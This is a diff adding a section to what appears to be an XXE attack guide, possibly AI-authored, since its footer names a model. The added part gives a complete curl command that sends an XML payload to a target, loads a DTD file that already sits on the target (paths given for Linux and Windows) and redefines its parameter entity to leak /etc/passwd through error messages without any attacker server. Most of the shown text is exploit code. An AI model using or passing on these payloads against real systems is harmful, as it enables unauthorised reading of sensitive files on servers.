@@ -307,6 +307,26 @@ curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '
 # File contents appear in error message: "file not found: /NONEXISTENT/<passwd contents>"
 ```
 
+**No outbound allowed? Reuse a DTD already on the target.** When the parser blocks external HTTP (can't fetch your `xxe.dtd`) but the app is otherwise vulnerable, reference a DTD file that already ships on the box and **redefine one of its parameter entities** to run the error-based exfil entirely locally — no attacker server needed:
+
+```bash
+# Linux target (GNOME/yelp present on many): /usr/share/yelp/dtd/docbookx.dtd defines %ISOamso;
+# Windows target: C:\Windows\System32\wbem\xml\cim20.dtd defines %SuperClass;
+curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso "
+    <!ENTITY &#x25; file SYSTEM &#x27;file:///etc/passwd&#x27;>
+    <!ENTITY &#x25; error &#x22;<!ENTITY &#x26;#x25; x SYSTEM &#x27;file:///NONEXISTENT/%file;&#x27;>&#x22;>
+    %error; %x;
+  ">
+  %local_dtd;
+]>
+<root><name>test</name></root>'
+# Find a candidate DTD + its overridable entity with: locate .dtd  (Linux) — see the
+# GracefulSecurity / PayloadsAllTheThings "existing DTD files" list for known-good ones.
+```
+
 ### XInclude — When You Can't Control the DOCTYPE
 
 If the app embeds your input *inside* its own XML document, you never get to declare a `<!DOCTYPE>` — so classic entity XXE is off the table. `XInclude` works from a single element instead.
@@ -578,5 +598,5 @@ curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-08-18*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
